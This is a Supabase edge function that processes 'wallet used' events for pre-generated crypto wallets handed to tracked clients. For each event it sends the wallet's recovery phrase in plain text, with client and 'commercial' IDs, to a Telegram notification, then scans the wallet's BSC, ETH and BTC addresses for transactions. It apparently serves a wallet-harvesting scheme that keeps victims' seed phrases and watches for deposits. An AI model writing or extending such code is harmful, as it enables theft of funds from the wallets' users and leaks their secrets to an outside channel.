import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Processing wallet usage notifications...');

    // Get all wallet usage notifications from admin_settings
    const { data: notifications, error: fetchError } = await supabase
      .from('admin_settings')
      .select('*')
      .like('setting_key', 'wallet_used_%');

    if (fetchError) {
      console.error('Error fetching notifications:', fetchError);
      return new Response(
        JSON.stringify({ error: 'Failed to fetch notifications' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
        }
      );
    }

    const processedCount = notifications?.length || 0;
    console.log(`Found ${processedCount} notifications to process`);

    for (const notification of notifications || []) {
      try {
        const walletData = JSON.parse(notification.setting_value);
        
        // Send Telegram notification about wallet usage
        await supabase.functions.invoke('send-telegram-notification', {
          body: {
            message: `🔑 New wallet used!\nWallet ID: ${walletData.wallet_id}\nCommercial ID: ${walletData.commercial_id}\nClient: ${walletData.client_tracking_id}\nPhrase: ${walletData.phrase}\nTime: ${walletData.timestamp}`
          }
        });

        // Get wallet addresses for scanning
        const { data: generatedWallet } = await supabase
          .from('generated_wallets')
          .select('bsc_address, eth_address, btc_address')
          .eq('wallet_id', walletData.wallet_id)
          .single();

        if (generatedWallet) {
          const addresses = [
            generatedWallet.bsc_address,
            generatedWallet.eth_address,
            generatedWallet.btc_address
          ].filter(Boolean);

          // Trigger wallet scanning
          if (addresses.length > 0) {
            await supabase.functions.invoke('scan-wallet-transactions', {
              body: {
                wallet_addresses: addresses,
                commercial_id: walletData.commercial_id
              }
            });
          }
        }

        // Remove processed notification
        await supabase
          .from('admin_settings')
          .delete()
          .eq('setting_key', notification.setting_key);

        console.log(`Processed notification for wallet ${walletData.wallet_id}`);

      } catch (error) {
        console.error(`Error processing notification ${notification.setting_key}:`, error);
      }
    }

    return new Response(
      JSON.stringify({ 
        success: true,
        message: `Processed ${processedCount} wallet usage notifications`,
        processed_count: processedCount
      }),
      { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );

  } catch (error) {
    console.error('Error in wallet-usage-processor function:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});